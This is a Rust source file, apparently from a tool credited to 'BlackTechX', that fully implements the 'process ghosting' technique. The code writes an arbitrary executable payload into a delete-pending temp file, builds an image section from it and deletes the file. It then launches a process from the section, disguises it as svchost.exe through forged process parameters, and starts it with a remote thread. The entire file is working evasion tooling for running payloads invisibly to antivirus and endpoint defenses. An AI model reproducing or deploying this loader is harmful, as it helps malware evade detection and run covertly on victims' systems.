//! Core Process Ghosting Implementation
//! Author: BlackTechX

#![allow(non_snake_case)]

use crate::ntapi::*;
use std::ptr;
use std::ffi::c_void;
use winapi::um::fileapi::{WriteFile, GetTempPathW, GetTempFileNameW};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::memoryapi::WriteProcessMemory;
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::winnt::{
    GENERIC_READ, GENERIC_WRITE, DELETE, SYNCHRONIZE,
    SECTION_ALL_ACCESS, PAGE_READONLY, SEC_IMAGE,
    PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
    THREAD_ALL_ACCESS, FILE_SHARE_READ, FILE_SHARE_WRITE,
};
use winapi::shared::minwindef::{DWORD, MAX_PATH, LPVOID};
use winapi::shared::ntdef::{HANDLE, PVOID, ULONG};
use winapi::shared::basetsd::SIZE_T;

/// Target architecture for the payload
#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Architecture {
    X86,
    X64,
}

impl std::fmt::Display for Architecture {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Architecture::X86 => write!(f, "x86"),
            Architecture::X64 => write!(f, "x64"),
        }
    }
}

/// Configuration for the ghosting operation
#[derive(Clone)]
pub struct GhostingConfig {
    pub payload: Vec<u8>,
    pub architecture: Architecture,
    pub verbose: bool,
}

impl GhostingConfig {
    /// Create a new configuration
    pub fn new(payload: Vec<u8>, architecture: Architecture) -> Self {
        Self {
            payload,
            architecture,
            verbose: true,
        }
    }

    /// Create configuration for x64 payload
    pub fn x64(payload: Vec<u8>) -> Self {
        Self::new(payload, Architecture::X64)
    }

    /// Create configuration for x86 payload
    pub fn x86(payload: Vec<u8>) -> Self {
        Self::new(payload, Architecture::X86)
    }
}

/// Helper macro for verbose printing
macro_rules! btx_print {
    ($verbose:expr, $($arg:tt)*) => {
        if $verbose {
            println!($($arg)*);
        }
    };
}

/// Create a wide string from a Rust string
fn to_wide_string(s: &str) -> Vec<u16> {
    use std::os::windows::ffi::OsStrExt;
    std::ffi::OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

/// Create a section from a file in delete-pending state
unsafe fn create_section_from_pending_deletion(
    file_path: &[u16],
    data_buffer: &[u8],
    verbose: bool,
) -> Result<HANDLE, String> {
    // Get NT functions
    let fn_nt_open_file: FnNtOpenFile = get_ntdll_function("NtOpenFile")?;
    let fn_rtl_init_unicode_string: FnRtlInitUnicodeString = get_ntdll_function("RtlInitUnicodeString")?;
    let fn_nt_set_information_file: FnNtSetInformationFile = get_ntdll_function("NtSetInformationFile")?;
    let fn_nt_create_section: FnNtCreateSection = get_ntdll_function("NtCreateSection")?;

    let mut file_handle: HANDLE = ptr::null_mut();
    let mut section_handle: HANDLE = ptr::null_mut();
    let mut unicode_file_path = UNICODE_STRING::default();
    let mut io_status_block = IO_STATUS_BLOCK::default();

    // Initialize unicode string
    fn_rtl_init_unicode_string(&mut unicode_file_path, file_path.as_ptr());

    // Initialize object attributes
    let mut object_attributes = OBJECT_ATTRIBUTES::new(&mut unicode_file_path, OBJ_CASE_INSENSITIVE);

    btx_print!(verbose, "[+] Attempting to open the file...");

    // Open file
    let status = fn_nt_open_file(
        &mut file_handle,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        &mut object_attributes,
        &mut io_status_block,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT,
    );

    if !nt_success(status) {
        return Err(format!("[-] Failed to open the file. NTSTATUS: 0x{:08X}", status));
    }

    btx_print!(verbose, "[+] Setting file to delete-pending state...");

    // Set disposition flag
    let mut file_disposition = FILE_DISPOSITION_INFORMATION { DeleteFile: 1 };

    let status = fn_nt_set_information_file(
        file_handle,
        &mut io_status_block,
        &mut file_disposition as *mut _ as PVOID,
        std::mem::size_of::<FILE_DISPOSITION_INFORMATION>() as ULONG,
        FILE_INFORMATION_CLASS::FileDispositionInformation,
    );

    if !nt_success(status) {
        CloseHandle(file_handle);
        return Err(format!("[-] Failed to set file to delete-pending state. NTSTATUS: 0x{:08X}", status));
    }

    btx_print!(verbose, "[+] Writing data to delete-pending file...");

    // Write payload to file
    let mut bytes_written: DWORD = 0;
    let write_result = WriteFile(
        file_handle,
        data_buffer.as_ptr() as *const c_void,
        data_buffer.len() as DWORD,
        &mut bytes_written,
        ptr::null_mut(),
    );

    if write_result == 0 {
        CloseHandle(file_handle);
        return Err("[-] Failed to write data to the file".to_string());
    }

    btx_print!(verbose, "[+] Creating section from delete-pending file...");

    // Create section
    let status = fn_nt_create_section(
        &mut section_handle,
        SECTION_ALL_ACCESS,
        ptr::null_mut(),
        ptr::null_mut(),
        PAGE_READONLY,
        SEC_IMAGE,
        file_handle,
    );

    if !nt_success(status) {
        CloseHandle(file_handle);
        return Err(format!("[-] Failed to create section from delete-pending file. NTSTATUS: 0x{:08X}", status));
    }

    btx_print!(verbose, "[+] Section successfully created from delete-pending file.");

    // Close the delete-pending file handle (this triggers deletion)
    CloseHandle(file_handle);
    btx_print!(verbose, "[+] File successfully deleted from disk...");

    Ok(section_handle)
}

/// Launch a process from a section
unsafe fn launch_process_from_section(section_handle: HANDLE, verbose: bool) -> Result<HANDLE, String> {
    let fn_nt_create_process_ex: FnNtCreateProcessEx = get_ntdll_function("NtCreateProcessEx")?;

    let mut process_handle: HANDLE = INVALID_HANDLE_VALUE;

    btx_print!(verbose, "[+] Creating process from section...");

    // Create process with file-less section
    let status = fn_nt_create_process_ex(
        &mut process_handle,
        PROCESS_ALL_ACCESS,
        ptr::null_mut(),
        GetCurrentProcess(),
        PS_INHERIT_HANDLES,
        section_handle,
        ptr::null_mut(),
        ptr::null_mut(),
        0,
    );

    if !nt_success(status) {
        return Err(format!("[-] Failed to create the process. NTSTATUS: 0x{:08X}", status));
    }

    Ok(process_handle)
}

/// Retrieve the entry point address
unsafe fn retrieve_entry_point(
    process_handle: HANDLE,
    payload_buffer: &[u8],
    process_info: &PROCESS_BASIC_INFORMATION,
    verbose: bool,
) -> Result<usize, String> {
    let fn_rtl_image_nt_header: FnRtlImageNtHeader = get_ntdll_function("RtlImageNtHeader")?;
    let fn_nt_read_virtual_memory: FnNtReadVirtualMemory = get_ntdll_function("NtReadVirtualMemory")?;

    let mut image_buffer = [0u8; 0x1000];
    let mut bytes_read: SIZE_T = 0;

    let status = fn_nt_read_virtual_memory(
        process_handle,
        process_info.PebBaseAddress as PVOID,
        image_buffer.as_mut_ptr() as PVOID,
        image_buffer.len(),
        &mut bytes_read,
    );

    if !nt_success(status) {
        return Err(format!("[-] Failed to read remote process PEB base address. NTSTATUS: 0x{:08X}", status));
    }

    let peb = &*(image_buffer.as_ptr() as *const PEB);
    let image_base = peb.ImageBaseAddress as usize;

    btx_print!(verbose, "[+] PEB Base Address of the target process: 0x{:016X}", image_base);

    // Get NT headers from payload
    let nt_headers = fn_rtl_image_nt_header(payload_buffer.as_ptr() as PVOID);
    if nt_headers.is_null() {
        return Err("[-] Failed to get NT headers from payload".to_string());
    }

    let entry_point_rva = (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize;
    let entry_point_address = entry_point_rva + image_base;

    btx_print!(verbose, "[+] Calculated EntryPoint of the payload buffer: 0x{:016X}", entry_point_address);

    Ok(entry_point_address)
}

/// Main function to execute the ghost process
pub fn execute_ghost_process(config: GhostingConfig) -> Result<(), String> {
    unsafe {
        let verbose = config.verbose;

        btx_print!(verbose, "[*] BlackTechX ProcessGhosting - Starting...");
        btx_print!(verbose, "[*] Target Architecture: {}", config.architecture);
        btx_print!(verbose, "[*] Payload Size: {} bytes", config.payload.len());

        // Validate payload (check for MZ header)
        if config.payload.len() < 2 || config.payload[0] != 0x4D || config.payload[1] != 0x5A {
            return Err("[-] Invalid payload: Missing MZ header".to_string());
        }

        // Get required NT functions
        let fn_query_process_info: FnNtQueryInformationProcess = 
            get_ntdll_function("NtQueryInformationProcess")?;
        let fn_init_unicode_str: FnRtlInitUnicodeString = 
            get_ntdll_function("RtlInitUnicodeString")?;
        let fn_create_remote_thread: FnNtCreateThreadEx = 
            get_ntdll_function("NtCreateThreadEx")?;
        let fn_write_memory: FnNtWriteVirtualMemory = 
            get_ntdll_function("NtWriteVirtualMemory")?;
        let fn_alloc_memory: FnNtAllocateVirtualMemory = 
            get_ntdll_function("NtAllocateVirtualMemory")?;
        let fn_create_proc_params: FnRtlCreateProcessParametersEx = 
            get_ntdll_function("RtlCreateProcessParametersEx")?;

        // Create temp file path with BlackTechX prefix
        let mut temp_dir = [0u16; MAX_PATH];
        let mut temp_file = [0u16; MAX_PATH];
        
        GetTempPathW(MAX_PATH as u32, temp_dir.as_mut_ptr());
        
        // Use "BTX" as prefix for temp files (BlackTechX)
        let btx_prefix: [u16; 4] = ['B' as u16, 'T' as u16, 'X' as u16, 0];
        GetTempFileNameW(
            temp_dir.as_ptr(),
            btx_prefix.as_ptr(),
            0,
            temp_file.as_mut_ptr(),
        );

        // Create NT path
        let temp_file_str: String = String::from_utf16_lossy(
            &temp_file[..temp_file.iter().position(|&c| c == 0).unwrap_or(temp_file.len())]
        );
        let full_path = format!("\\??\\{}", temp_file_str);
        let nt_path_wide = to_wide_string(&full_path);

        btx_print!(verbose, "[+] Temp file path: {}", temp_file_str);

        // Create section from pending deletion
        let section_handle = create_section_from_pending_deletion(
            &nt_path_wide,
            &config.payload,
            verbose,
        )?;

        if section_handle == INVALID_HANDLE_VALUE || section_handle.is_null() {
            return Err("[-] Failed to create memory section".to_string());
        }

        // Launch process from section
        let target_process = launch_process_from_section(section_handle, verbose)?;

        if target_process == INVALID_HANDLE_VALUE || target_process.is_null() {
            return Err("[-] Failed to create ghosted process".to_string());
        }

        btx_print!(verbose, "[+] Ghosted process created successfully.");

        // Retrieve process information
        let mut proc_basic_info = PROCESS_BASIC_INFORMATION::default();
        let mut proc_info_length: ULONG = 0;

        let status = fn_query_process_info(
            target_process,
            PROCESSINFOCLASS::ProcessBasicInformation,
            &mut proc_basic_info as *mut _ as PVOID,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            &mut proc_info_length,
        );

        if !nt_success(status) {
            return Err(format!("[-] Failed to retrieve process information. NTSTATUS: 0x{:08X}", status));
        }

        // Retrieve entry point
        let ep_address = retrieve_entry_point(
            target_process,
            &config.payload,
            &proc_basic_info,
            verbose,
        )?;

        // Create process parameters - use svchost.exe as cover
        let target_path = to_wide_string("C:\\Windows\\System32\\svchost.exe");
        let mut unicode_target_file = UNICODE_STRING::default();
        fn_init_unicode_str(&mut unicode_target_file, target_path.as_ptr());

        let dll_dir = to_wide_string("C:\\Windows\\System32");
        let mut unicode_dll_path = UNICODE_STRING::default();
        fn_init_unicode_str(&mut unicode_dll_path, dll_dir.as_ptr());

        let mut proc_params: *mut RTL_USER_PROCESS_PARAMETERS = ptr::null_mut();

        let status = fn_create_proc_params(
            &mut proc_params,
            &mut unicode_target_file,
            &mut unicode_dll_path,
            ptr::null_mut(),
            &mut unicode_target_file,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            RTL_USER_PROC_PARAMS_NORMALIZED,
        );

        if !nt_success(status) || proc_params.is_null() {
            return Err(format!("[-] Failed to create process parameters. NTSTATUS: 0x{:08X}", status));
        }

        // Allocate memory for process parameters in target process
        let mut param_buffer: PVOID = proc_params as PVOID;
        let mut param_size: SIZE_T = ((*proc_params).EnvironmentSize + (*proc_params).MaximumLength as usize) as SIZE_T;

        let status = fn_alloc_memory(
            target_process,
            &mut param_buffer,
            0,
            &mut param_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if !nt_success(status) {
            return Err(format!("[-] Failed to allocate memory for process parameters. NTSTATUS: 0x{:08X}", status));
        }

        btx_print!(verbose, "[+] Allocated memory for process parameters at {:p}.", param_buffer);

        // Write process parameters into the target process
        let write_size = (*proc_params).EnvironmentSize + (*proc_params).MaximumLength as usize;
        let _status = fn_write_memory(
            target_process,
            proc_params as PVOID,
            proc_params as PVOID,
            write_size,
            ptr::null_mut(),
        );

        // Get remote PEB
        let remote_peb = proc_basic_info.PebBaseAddress;

        // Update the address of the process parameters in the target process's PEB
        let proc_params_ptr = proc_params as PVOID;
        let peb_params_offset = &(*remote_peb).ProcessParameters as *const _ as *mut c_void;
        
        let write_result = WriteProcessMemory(
            target_process,
            peb_params_offset,
            &proc_params_ptr as *const _ as *const c_void,
            std::mem::size_of::<PVOID>(),
            ptr::null_mut(),
        );

        if write_result == 0 {
            return Err("[-] Failed to update process parameters in the target PEB".to_string());
        }

        btx_print!(verbose, "[+] Updated process parameters address in the remote PEB.");

        // Create the thread to execute the ghosted process
        let mut remote_thread: HANDLE = ptr::null_mut();

        let status = fn_create_remote_thread(
            &mut remote_thread,
            THREAD_ALL_ACCESS,
            ptr::null_mut(),
            target_process,
            ep_address as LPVOID,
            ptr::null_mut(),
            0,
            0,
            0,
            0,
            ptr::null_mut(),
        );

        if !nt_success(status) {
            return Err(format!("[-] Failed to create remote thread. NTSTATUS: 0x{:08X}", status));
        }

        btx_print!(verbose, "[+] Remote thread created and executed.");
        btx_print!(verbose, "[+] BlackTechX ProcessGhosting completed successfully!");

        Ok(())
    }
}